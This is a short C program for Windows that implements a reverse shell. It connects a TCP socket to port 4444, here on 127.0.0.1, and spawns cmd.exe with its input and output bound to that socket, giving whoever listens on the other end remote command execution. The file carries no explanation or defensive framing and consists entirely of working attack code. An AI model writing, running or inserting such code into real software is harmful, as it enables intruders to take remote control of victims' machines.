#include <winsock2.h> 
#include <stdio.h> 
#pragma comment(lib,"Ws2_32") 

#define LISTEN_PORT 4444
int main() {
	WSADATA ws;
	SOCKET listenFD;
	int ret;
	WSAStartup(MAKEWORD(2, 2), &ws);
	listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_port = htons(LISTEN_PORT);
	server.sin_addr.s_addr = inet_addr("127.0.0.1");

	int len = sizeof(server);

	int x = connect(listenFD,(sockaddr*)&server,len);
	if(x == SOCKET_ERROR)
	{
		printf("%d(error)\n",WSAGetLastError());
		return -1;
	}
	
	
	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (void *) listenFD;
	PROCESS_INFORMATION pi;
	TCHAR app_spawn[] = TEXT("C:\\WINDOWS\\system32\\cmd.exe");
	if (!CreateProcess(app_spawn, NULL, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		wprintf(L"CreateProcess failed:%d", GetLastError());
		return 0;
	}
	return 0;
}
